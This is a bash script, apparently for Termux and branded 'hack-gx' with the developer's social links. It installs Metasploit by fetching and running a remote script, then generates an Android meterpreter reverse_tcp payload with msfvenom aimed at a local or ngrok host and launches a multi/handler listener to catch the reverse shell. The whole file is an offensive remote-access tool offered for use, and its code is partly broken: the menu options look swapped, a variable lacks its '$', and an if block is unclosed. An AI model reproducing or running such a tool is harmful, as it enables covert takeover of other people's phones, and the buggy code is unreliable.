#!/bin/bash

sleep 2
clear

########colors###########
yellow='\033[1;33m'
red='\033[1;31m'
green='\033[1;32m'
####Dvariabales#####
you="https://www.youtube.com/@linux_whith_mohamed"
wa="https://wa.me/+994402309201"
te="https://t.me/Dev_GX"
#########Tool#########
sleep 0.2s
echo -e $green "╔═╗┌─┐┬┌─  ┌─┐┌─┐┌┐┌┌─┐┬─┐┌─┐┌┬┐┌─┐┬─┐  "
sleep 0.2s
echo -e $red   "╠═╣├─┘├┴┐  │ ┬├┤ │││├┤ ├┬┘├─┤ │ │ │├┬┘  "
sleep 0.2s
echo -e $green "╩ ╩┴  ┴ ┴  └─┘└─┘┘└┘└─┘┴└─┴ ┴ ┴ └─┘┴└─  "
sleep 0.2s
echo -e "  $red Developer : $green Anonymous $red GX "
sleep 0.2s
echo ''
sleep 0.2s
echo -e " $red Youtube : $green $you "
sleep 0.2s
echo " "
sleep 0.2s
echo -e "  $green whatsapp : $red $wa "
sleep 0.2s
echo ''
sleep 0.2s
echo -e "     $green Telegram : $red $te "
sleep 3
clear
# دالة للتحقق مما إذا كان Metasploit مثبتًا
function check_metasploit_installed() {
    if command -v msfconsole >/dev/null 2>&1; then
        echo -e "$green [ ☆ ] Metasploit is installed."
        return 0
    else
        echo -e "$red [•] Metasploit is not installed."
        return 1
    fi
}

# دالة لتثبيت Metasploit
function install_metasploit() {
    echo "𝐈𝐧𝐬𝐭𝐚𝐥𝐥𝐢𝐧𝐠 𝐌𝐞𝐭𝐚𝐬𝐩𝐥𝐨𝐢𝐭 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭 ..."
    rm -rf metasploit.sh
    apt update 
    apt install wget curl openssh git -y
    apt install ruby -y
    apt install ncurses-utils -y
    curl -LO https://raw.githubusercontent.com/gushmazuko/metasploit_in_termux/master/metasploit.sh
    chmod +x metasploit.sh
    ./metasploit.sh
    echo -e "$green [☆] Metasploit installation completed."
}

# دالة لسؤال المستخدم إذا كان يريد التثبيت
function prompt_install_metasploit() {
    read -p "Do you want to install Metasploit? (y/n): " choice
    case "$choice" in
        y|Y )
            install_metasploit
            ;;
        n|N )
            echo -e "$red [!] Installation aborted."
            exit
            ;;
        * )
            echo -e "$red [!] Invalid choice. Please enter y or n."
            prompt_install_metasploit
            ;;
    esac
}

# التحقق مما إذا كان Metasploit مثبتًا واستدعاء الدالة المناسبة
if ! check_metasploit_installed; then
    prompt_install_metasploit
else
    echo ''
    echo "No need to install Metasploit. It is already installed."
fi

rm -rf metasploit.sh

sleep 2s
clear
echo -e $green "╔═╗┌─┐┬┌─  ┌─┐┌─┐┌┐┌┌─┐┬─┐┌─┐┌┬┐┌─┐┬─┐  "
sleep 0.2s
echo -e $red   "╠═╣├─┘├┴┐  │ ┬├┤ │││├┤ ├┬┘├─┤ │ │ │├┬┘  "
sleep 0.2s
echo -e $green "╩ ╩┴  ┴ ┴  └─┘└─┘┘└┘└─┘┴└─┴ ┴ ┴ └─┘┴└─  "
sleep 0.2s
echo -e "      $red developer : $green Medo GX "
sleep 0.2s
echo -e "     $red script $green version 2 "
sleep 0.2s
echo ''
echo ''
sleep 0.2s
read -p 'please Enter your host : ' ip 
read -p 'please Enter your port : ' port
sleep 0.3s
echo ""
read -p 'please Enter your ngrok ip or host : ' ngip
read -p 'please Enter port you open in ngrok : ' yport
read -p 'please Enter your ngrok port : ' ngport
sleep 0.2s
echo ''
read -p 'please Enter payload name : ' path 

msf="msfvenom -p android/meterpreter/reverse_tcp Lhost=$ip Lport=$port -o $path"
msfng="msfvenom -p android/meterpreter/reverse_tcp Lhost=$ngip Lport=ngport -o $path "
sleep 3s 
clear
sleep 0.2s
echo -e $green "╔═╗┌─┐┬┌─  ┌─┐┌─┐┌┐┌┌─┐┬─┐┌─┐┌┬┐┌─┐┬─┐  "
sleep 0.2s
echo -e $red   "╠═╣├─┘├┴┐  │ ┬├┤ │││├┤ ├┬┘├─┤ │ │ │├┬┘  "
sleep 0.2s
echo -e $green "╩ ╩┴  ┴ ┴  └─┘└─┘┘└┘└─┘┴└─┴ ┴ ┴ └─┘┴└─  "
sleep 0.2s
echo -e "      $red developer : $green Medo GX "
sleep 0.2s
echo -e "     $red script $green v1 "
echo ''
echo ''
sleep 0.2s
echo '[1] ngrok payload '
sleep 0.2s 
echo ''
echo '[2] generate payload '
sleep 0.2s
echo ''
sleep 0.2s
echo '[3] start listener '
sleep 0.2s
echo ''
sleep 0.2s
echo '[4] youtube '
sleep 0.2s
echo ''
sleep 0.2s
read -p 'choice : ' ch
if [ $ch == 1 ]; then 
    sleep 1s
    clear
    echo -e "$green Generating your payload please wait ...."
    $msf
    echo -e "$green Successful Generation Payload ☆ "
    sleep 0.4s 
    echo -e "$green saved to > payload-generator/$path"
elif [$ch == 2 ]; then
    sleep 1s
    clear
    echo -e "$green Generating your payload please wait ...."
    $msfng
    echo -e "$green Successful Generation Payload ☆ "
    sleep 0.4s
    echo -e "$green saved to > payload-generator/$path"
elif [ $ch == 3 ]; then 
    sleep 1s
    clear
    sleep 0.2s 
    echo -e "$yellow [1] listener to local host "
    sleep 0.2s
    echo -e "$yellow [2] listener to ngrok host"
    sleep 0.2s
    read -p 'choose from 1 or 2 : ' lch
   if [$lch == 1 ]; then 
        sleep 0.2s 
        echo ''
        echo -e "$yellow listening to local host please wait ..."
        msfconsole -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set lhost=$ip ; set lport=$port ; run "
        elif [ $lch == 2 ]; then
            sleep 0.2s
            echo ''
            echo -e "$yellow listening to ngrok host please wait ..."
	    msfconsole -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set lhost=0.0.0.0 ; set lport=$yport ; run"

elif [ $ch == 4 ]; then 
    sleep 1s
    clear
    termux-open-url https://www.youtube.com/@linux_whith_mohamed

else 
    echo -e "$red Error : please choose an number from list {1,2,3}"
    sleep 3s
    clear 
    echo -e "$red restarting ...."
    sleep 2s
    bash hack-gx.sh
    
fi
 
